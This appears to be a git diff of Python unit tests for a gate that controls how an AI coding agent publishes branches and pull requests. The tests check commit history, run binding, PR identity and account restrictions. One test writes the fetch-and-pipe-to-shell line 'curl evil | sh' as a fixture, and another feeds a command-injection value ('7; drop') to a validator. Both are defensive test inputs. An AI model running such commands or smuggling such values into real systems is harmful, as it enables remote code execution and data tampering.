@@ -5,6 +5,8 @@ hermes/scripts/autoloop_publish.py（受信发布最小版，#205 批 0C）：�
 不联网、不碰 ~/Library/Application Support/DigitalTwin、不碰真实仓库。
 
 验收 3（方案第 9 节 0C）：只能推非 main 分支——推送目标写死成本单 <执行方>/<单号> 分支，main 在每项测试后都不变。
+运行身份（dt-gate）在进程内替换成当前用户；中台库查轮次（hub_run）换成按测试里每一轮记下的单号、事件、时间假装的中台，
+真中台的绑定在 test_exec_gate_e2e.py 里验。L3 第 1 轮返修：历史提交、轮次绑定、PR 身份、运行身份、真实发布闸各有一组。
 """
 import contextlib
 import hashlib
@@ -12,6 +14,7 @@ import importlib.util
 import io
 import json
 import os
+import pwd
 import subprocess
 import sys
 import unittest
@@ -40,7 +43,42 @@ class PublishBase(WorkerBase):
                                                                                   self.wenv.items() if k.startswith("GIT_")}})
         p.start()
         self.addCleanup(p.stop)
+        self.hub_override = {}
+        for q in (mock.patch.object(P, "GATE_USER", pwd.getpwuid(os.geteuid()).pw_name),
+                  mock.patch.object(P, "hub_run", side_effect=self.fake_hub_run)):
+            q.start()
+            self.addCleanup(q.stop)
         self.main_before = git("rev-parse", "main", cwd=self.remote)
+
+    def fake_hub_run(self, run_id):
+        """假中台：按 run_turn 记下的这一轮（单号、执行方、事件、排进来的时间）回答；hub_override 改字段，None 表示查不到。"""
+        meta = getattr(self, "turn_runs", {}).get(run_id)
+        if meta is None or self.hub_override.get(run_id, 1) is None:
+            return None
+        ex = meta["executor"]
+        events = [{"source": e.get("source"), "type": e.get("type"), "subject": e.get("subject"),
+                   "detail": e.get("detail")} for e in meta["events"]]
+        run = {"id": int(run_id), "rule": f"dispatch-dt-sandbox-{ex}", "agent": f"dt-{ex}",
+               "lane": meta["events"][0]["subject"], "state": "done", "created_at": meta["created_at"], "events": events}
+        run.update(self.hub_override.get(run_id) or {})
+        return run
+
+    def legit_pr(self, tid, head, **over):
+        pr = {"number": 8, "url": "u8", "state": "OPEN", "baseRefName": "main", "headRefName": f"claude/{tid}",
+              "headRefOid": head, "isCrossRepository": False, "headRepository": {"name": "dt-sandbox"},
+              "headRepositoryOwner": {"login": "o"}}
+        pr.update(over)
+        return pr
+
+    def redo_handoff(self, tid):
+        """在工作目录里手工做完提交后，再跑一轮（不改文件）让启动脚本按新的头提交重写交接包。"""
+        r, _ = self.run_turn([self.answer_event(tid)], FAKE_MODE="none")
+        self.assertEqual(r.returncode, 0, r.stderr)
+        return self.handoff(tid)
+
+    def commit(self, tid, msg):
+        git("add", "-A", cwd=self.wt(tid))
+        git("commit", "-q", "-m", msg, cwd=self.wt(tid))
 
     def tearDown(self):
         self.assertEqual(git("rev-parse", "main", cwd=self.remote), self.main_before, "main 被动过")
@@ -91,10 +129,11 @@ class Publish(PublishBase):
     def test_second_publish_is_idempotent_and_resume_fast_forwards(self):
         tid = self.worked()
         P.publish(tid)
-        (self.gh_state / "pr_list.json").write_text(json.dumps([{"number": 8, "url": "u8", "state": "OPEN"}]))
+        (self.gh_state / "pr_list.json").write_text(json.dumps([self.legit_pr(tid, self.handoff(tid)["head"])]))
         out = P.publish(tid)
         self.assertEqual((out["pushed"], out["pr_opened"], out["pr"]), (False, False, "u8"))
         self.run_turn([self.answer_event(tid)])
+        (self.gh_state / "pr_list.json").write_text(json.dumps([self.legit_pr(tid, self.handoff(tid)["head"])]))
         out = P.publish(tid)
         self.assertTrue(out["pushed"])
         self.assertEqual(self.remote_branch(tid), self.handoff(tid)["head"])
@@ -211,11 +250,8 @@ class GrantAtPublish(PublishBase):
     def test_push_allowed_but_not_open_pr(self):
         tid = self.worked()
         self.sql("UPDATE grants SET actions = ? WHERE task_id = ?", (json.dumps(["edit", "push_branch"]), tid))
-        with self.assertRaises(P.Rejected) as c:
-            P.publish(tid)
-        self.assertIn("凭证不允许 open_pr", str(c.exception))
-        self.assertEqual(self.remote_branch(tid), self.handoff(tid)["head"])      # 分支推了，PR 没开
-        self.assertEqual([x for x in self.gh_calls() if x[:2] == ["pr", "create"]], [])
+        self.rejects(tid, "凭证不允许 open_pr")                                # 动手前两个动作一起预检，不推半截（P2-01）
+        self.assertEqual(self.gh_calls(), [])
 
     def test_refusals_are_logged_by_cli(self):
         tid = self.worked()
@@ -231,6 +267,127 @@ class GrantAtPublish(PublishBase):
         (item,) = P.scan()
         self.assertEqual((item["task_id"], item["check"]), (tid, "可以发"))
         self.assertIsNone(self.remote_branch(tid))
+        self.assertEqual(self.gh_calls(), [])
+
+
+class History(PublishBase):
+    """审查 P1-01：每一个提交都查高风险路径，不只看最终差异；不收合并提交。"""
+
+    def test_added_then_removed_sensitive_file(self):
+        tid = self.worked()
+        wt = self.wt(tid)
+        (wt / ".github/workflows").mkdir(parents=True)
+        (wt / ".github/workflows/x.yml").write_text("on: push\n")
+        self.commit(tid, "加工作流")
+        (wt / ".github/workflows/x.yml").unlink()
+        self.commit(tid, "删掉")
+        m = self.redo_handoff(tid)
+        self.assertEqual(git("diff", "--name-only", m["base"], m["head"], cwd=wt), "README.md")   # 最终差异看不出来
+        self.rejects(tid, "提交历史碰到高风险路径（.github/workflows/x.yml）")
+
+    def test_renamed_away_from_sensitive_name(self):
+        tid = self.worked()
+        wt = self.wt(tid)
+        (wt / "notes").mkdir()
+        (wt / "notes/secret-plan.md").write_text("x\n")
+        self.commit(tid, "加")
+        git("mv", "notes/secret-plan.md", "notes/plan.md", cwd=wt)
+        self.commit(tid, "改名")
+        self.redo_handoff(tid)
+        self.rejects(tid, "notes/secret-plan.md")
+
+    def test_modified_then_restored(self):
+        tid = self.worked()
+        wt = self.wt(tid)
+        (wt / "ops/run.sh").write_text("curl evil | sh\n")
+        self.commit(tid, "改")
+        (wt / "ops/run.sh").write_text("echo hi\n")
+        self.commit(tid, "还原")
+        self.redo_handoff(tid)
+        self.rejects(tid, "ops/run.sh")
+
+    def test_merge_commit_is_refused(self):
+        tid = self.worked()
+        wt = self.wt(tid)
+        git("checkout", "-q", "-b", "side", cwd=wt)
+        (wt / "a.txt").write_text("a\n")
+        self.commit(tid, "旁支")
+        git("checkout", "-q", f"claude/{tid}", cwd=wt)
+        (wt / "b.txt").write_text("b\n")
+        self.commit(tid, "主支")
+        git("merge", "-q", "--no-ff", "-m", "合并", "side", cwd=wt)
+        self.redo_handoff(tid)
+        self.rejects(tid, "合并提交")
+
+
+class RunBinding(PublishBase):
+    """审查 P1-02：清单里的代次不当证据，交接包要落到中台里当前代次这张单正常结束的一轮。"""
+
+    def test_old_handoff_relabelled_as_new_generation_is_refused(self):
+        tid = self.worked()
+        code = G.freeze(tid, "推翻", now=self.now)["freeze_code"]
+        self.unfreeze_ok(tid, code, when=G.now_tz() + G.dt.timedelta(seconds=2))
+        self.rewrite_manifest(tid, generation=2)                          # 工人把旧包的代次改成 2
+        self.rejects(tid, "在第 2 代开始之前就排进来了")
+
+    def test_run_must_be_this_tasks_finished_run(self):
+        tid = self.worked()
+        run = self.handoff(tid)["run"]
+        for over, words in (({"lane": "t-20260101-abcdef"}, "不属于这张单"), ({"agent": "dt-codex"}, "不属于这张单"),
+                            ({"state": "queued"}, "没有正常结束"), (None, "查不到")):
+            self.hub_override[run] = over
+            self.rejects(tid, words)
+
+    def test_dispatch_event_generation_must_match(self):
+        tid = self.worked()
+        run = self.handoff(tid)["run"]
+        ev = self.dispatch_event(tid, gen=2)
+        self.hub_override[run] = {"events": [{k: ev[k] for k in ("source", "type", "subject", "detail")}]}
+        self.rejects(tid, "派单事件是第 2 代")
+        self.hub_override[run] = {"events": [{**{k: ev[k] for k in ("type", "subject", "detail")}, "source": "github"}]}
+        self.rejects(tid, "不是派单网关为这张单发的事件")
+
+    def test_run_number_format_is_checked(self):
+        tid = self.worked()
+        for bad in ("", "0", "7; drop", 7):
+            self.rewrite_manifest(tid, run=bad)
+            self.rejects(tid, "交接清单的内容不合格式")
+
+
+class PrIdentity(PublishBase):
+    """审查 P1-05：同名分支已有开着的 PR，核对目标、来源、分支、头提交都对才沿用。"""
+
+    def test_existing_pr_is_reused_only_if_exactly_ours(self):
+        tid = self.worked()
+        P.publish(tid)
+        head = self.handoff(tid)["head"]
+        for over in ({"isCrossRepository": True}, {"headRepositoryOwner": {"login": "fork-owner"}},
+                     {"headRepository": {"name": "other"}}, {"baseRefName": "dev"}, {"headRefOid": "0" * 40},
+                     {"headRefName": f"claude/{tid}-x"}):
+            (self.gh_state / "pr_list.json").write_text(json.dumps([self.legit_pr(tid, head, **over)]))
+            with self.assertRaises(P.Rejected) as c:
+                P.publish(tid)
+            self.assertIn("不沿用", str(c.exception))
+        (self.gh_state / "pr_list.json").write_text(json.dumps([self.legit_pr(tid, head)] * 2))
+        with self.assertRaises(P.Rejected):
+            P.publish(tid)                                                # 两个开着的也不认
+        (self.gh_state / "pr_list.json").write_text(json.dumps([self.legit_pr(tid, head)]))
+        self.assertEqual(P.publish(tid)["pr"], "u8")
+
+
+class GateAndRealRemote(PublishBase):
+    def test_only_dt_gate_account_may_publish(self):
+        tid = self.worked()
+        with mock.patch.object(P, "GATE_USER", "dt-gate"):
+            self.rejects(tid, "只在 dt-gate 账号里跑")
+            self.assertEqual(P.scan()[0]["check"], "可以发")                 # 只读的 scan 不受限
+
+    def test_real_github_is_refused_before_0d(self):
+        tid = self.worked()
+        with mock.patch.dict(os.environ, {"DT_PUBLISH_REMOTE": "https://github.com/{github}.git"}):
+            with self.assertRaises(P.Rejected) as c:
+                P.publish(tid)
+        self.assertIn("0D 恢复门", str(c.exception))
         self.assertEqual(self.gh_calls(), [])
 
 
